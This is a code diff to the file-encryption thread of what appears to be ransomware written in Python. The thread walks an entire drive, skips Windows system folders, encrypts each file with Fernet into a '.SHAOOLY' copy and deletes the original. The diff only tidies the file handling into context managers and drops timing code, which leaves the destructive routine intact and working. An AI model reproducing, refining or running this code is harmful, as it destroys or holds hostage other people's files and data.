@@ -8,7 +8,8 @@ class Encrypt(Thread):
 
     def __init__(self, drive):
         self.drive = drive
-        key = open("file_encryption_key.txt", 'rb').read()
+        with open("file_encryption_key.txt", 'rb') as key_file:
+            key = key_file.read()
         self.fernet = Fernet(key)
         self.accepted_extensions = [
                                     "Sxw",
@@ -180,7 +181,6 @@ class Encrypt(Thread):
                                     ]
 
     def run(self):
-        start = time.perf_counter()
         for r, d, f in os.walk(self.drive):
             if r.split("\\")[1] not in ["Windows", "Program Files", "Program Files (x86)", "PerfLogs"]:
                 for file in f:
@@ -192,11 +192,8 @@ class Encrypt(Thread):
                             file_extension = file.split(".")[-1]
                         file_name = file.split(".")[0]
                         enc_file_name = f'{r}/{file_name}.SHAOOLY'
-                        byte_file = open(filepath, 'rb')
-                        enc_file_content = self.fernet.encrypt(byte_file.read())
-                        encrypted_file = open(enc_file_name, 'x')
-                        encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
-                        byte_file.close()
+                        with open(filepath, 'rb') as byte_file:
+                            enc_file_content = self.fernet.encrypt(byte_file.read())
+                        with open(enc_file_name, 'x') as encrypted_file:
+                            encrypted_file.write(file_extension + '\n' + enc_file_content.decode())
                         os.remove(filepath)
-        end = time.perf_counter()
-        print(end - start)
